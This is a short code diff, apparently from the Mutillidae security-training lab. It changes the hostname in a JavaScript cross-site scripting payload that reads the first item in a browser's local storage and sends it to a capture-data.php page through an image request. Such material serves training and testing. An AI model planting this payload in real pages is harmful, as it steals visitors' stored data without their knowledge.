@@ -6,7 +6,7 @@ var d = l.getItem(l.key(0));
 
 var i = new Image();
 
-i.src = "http://mutillidae.local/capture-data.php&d="+d;
+i.src = "http://mutillidae.localhost/capture-data.php&d="+d;
 
 </script>
 
